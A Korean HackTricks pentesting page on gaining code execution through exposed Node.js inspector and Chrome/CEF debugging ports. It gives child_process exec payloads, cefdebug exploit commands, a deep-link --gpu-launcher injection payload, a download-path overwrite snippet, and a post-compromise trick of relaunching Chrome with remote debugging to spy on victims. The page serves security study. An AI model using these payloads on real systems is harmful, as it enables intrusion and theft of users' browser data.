# Node inspector/CEF debug 남용

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>에서 <strong>제로부터 영웅까지 AWS 해킹 배우기</strong>!</summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나** **PDF 형식의 HackTricks를 다운로드**하고 싶다면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 저희의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** 트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요**.
* **해킹 트릭을 공유하고 싶다면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## 기본 정보

[문서에서](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started) 가져온 내용: `--inspect` 스위치로 시작하면 Node.js 프로세스가 디버깅 클라이언트를 수신합니다. **기본적으로**, 호스트 및 포트 **`127.0.0.1:9229`**에서 수신합니다. 각 프로세스에는 **고유한** **UUID**가 할당됩니다.

Inspector 클라이언트는 호스트 주소, 포트 및 UUID를 알고 지정하여 연결해야 합니다. 전체 URL은 `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`와 같을 것입니다.

{% hint style="warning" %}
**디버거가 Node.js 실행 환경에 완전한 액세스 권한을 갖기 때문에**, 이 포트에 연결할 수 있는 악의적인 사용자는 Node.js 프로세스를 통해 임의의 코드를 실행할 수 있을 수 있습니다 (**잠재적인 권한 상승**).
{% endhint %}

Inspector를 시작하는 여러 가지 방법이 있습니다:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
검사된 프로세스를 시작하면 다음과 같은 내용이 표시됩니다:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF** (**Chromium Embedded Framework**)와 같은 기반 **프로세스**는 **디버거**를 열기 위해 `--remote-debugging-port=9222`와 같은 **매개변수**를 사용해야 합니다 (SSRF 보호 기능은 매우 유사한 상태로 유지됩니다). 그러나 이들은 **NodeJS 디버그** 세션을 부여하는 대신 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)을 사용하여 브라우저와 통신할 것입니다. 이는 브라우저를 제어하기 위한 인터페이스이지만 직접적인 RCE는 없습니다.

디버그된 브라우저를 시작하면 다음과 같은 내용이 나타납니다:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### 브라우저, 웹소켓 및 동일 출처 정책 <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

웹 브라우저에서 열리는 웹사이트는 브라우저 보안 모델에 따라 WebSocket 및 HTTP 요청을 할 수 있습니다. **고유한 디버거 세션 ID를 얻기 위해 초기 HTTP 연결**이 필요합니다. **동일 출처 정책**은 웹사이트가 **이 HTTP 연결**을 만들 수 없도록 합니다. [**DNS 리바인딩 공격**](https://en.wikipedia.org/wiki/DNS\_rebinding)**에 대한 추가 보안으로,** Node.js는 연결의 **'Host' 헤더**가 **IP 주소** 또는 **`localhost`** 또는 **`localhost6`**을 명확히 지정해야 한다고 확인합니다.

{% hint style="info" %}
이 **보안 조치는 인스펙터를 악용하여 코드를 실행하는 것을 방지**하여 **단순히 HTTP 요청을 보내는 것**으로 (SSRF 취약점을 악용할 수 있는) **공격을 방지**합니다.
{% endhint %}

### 실행 중인 프로세스에서 인스펙터 시작

실행 중인 nodejs 프로세스에 **시그널 SIGUSR1**을 보내면 **기본 포트에서 인스펙터를 시작**할 수 있습니다. 그러나 충분한 권한이 필요하므로 이로 인해 **프로세스 내부 정보에 대한 특권 액세스**가 부여될 수 있지만 직접적인 특권 상승은 이루어지지 않을 수 있습니다.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
컨테이너에서 유용한 이유는 `--inspect`로 **프로세스를 종료하고 새로 시작**하는 것이 **옵션으로 사용할 수 없기** 때문에 **컨테이너**가 **프로세스와 함께 종료**될 것이기 때문입니다.
{% endhint %}

### Inspector/Debugger에 연결

**크로미움 기반 브라우저**에 연결하려면 Chrome 또는 Edge에 대해 각각 `chrome://inspect` 또는 `edge://inspect` URL에 액세스할 수 있습니다. 구성 버튼을 클릭하여 **대상 호스트와 포트**가 올바르게 나열되어 있는지 확인해야 합니다. 다음 이미지는 원격 코드 실행(RCE) 예제를 보여줍니다:

![](<../../.gitbook/assets/image (674).png>)

**명령줄**을 사용하여 디버거/인스펙터에 연결할 수 있습니다:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
도구 [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug)은 로컬에서 실행 중인 **인스펙터를 찾아내**고 **코드를 주입**할 수 있습니다.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
**NodeJS RCE exploits won't work**이 브라우저에 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)을 통해 연결된 경우에는 작동하지 않습니다(흥미로운 작업을 수행할 API를 찾아보아야 합니다).
{% endhint %}

## NodeJS 디버거/인스펙터에서의 RCE

{% hint style="info" %}
[**일렉트론의 XSS에서 RCE를 얻는 방법을 찾고 있다면 이 페이지를 확인하십시오.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

Node **인스펙터**에 **연결**할 수 있는 경우 **RCE**를 얻는 일반적인 방법 중 일부는 다음과 같습니다(Chrome DevTools 프로토콜에 연결된 경우 작동하지 않는 것으로 보입니다):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools Protocol Payloads

API 확인은 여기에서 할 수 있습니다: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
이 섹션에서는 이 프로토콜을 악용하는 데 사용된 흥미로운 사례들을 나열할 것입니다.

### 딥 링크를 통한 매개변수 주입

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)에서 Rhino Security는 CEF를 기반으로 한 응용 프로그램이 시스템에 사용자 정의 URI (workspaces://)를 등록했으며 이 URI를 수신한 후 그 URI에서 부분적으로 구성된 구성으로 CEF 기반 응용 프로그램을 실행했다는 것을 발견했습니다.

URI 매개변수가 URL 디코딩되어 CEF 기본 응용 프로그램을 실행하는 데 사용되었으며 사용자가 **`--gpu-launcher`** 플래그를 **명령줄**에 주입하고 임의의 작업을 실행할 수 있도록 했습니다.

따라서 다음과 같은 페이로드:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
### 파일 덮어쓰기

**다운로드된 파일이 저장될 폴더**를 변경하고 자주 사용되는 **애플리케이션의 소스 코드를 덮어쓰기**하기 위해 파일을 다운로드합니다.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE 및 데이터 유출

이 게시물에 따르면: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) theriver에서 RCE를 얻고 내부 페이지를 유출하는 것이 가능합니다.

### 사후 공격

실제 환경에서 **사용자 PC를 침해한 후** Chrome/Chromium 기반 브라우저를 사용하는 사용자의 경우 디버깅이 활성화된 Chrome 프로세스를 시작하고 디버깅 포트를 포워딩하여 액세스할 수 있습니다. 이렇게 하면 피해자가 Chrome에서 수행하는 모든 작업을 **검사하고 민감한 정보를 도난할 수 있습니다**.

은밀한 방법은 **모든 Chrome 프로세스를 종료**한 다음 다음과 같이 호출하는 것입니다.
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## 참고 자료

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>로부터 제로에서 히어로까지 AWS 해킹 배우기!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나** **HackTricks를 PDF로 다운로드**하고 싶다면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** 트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **당신의 해킹 트릭을 공유하세요.**

</details>
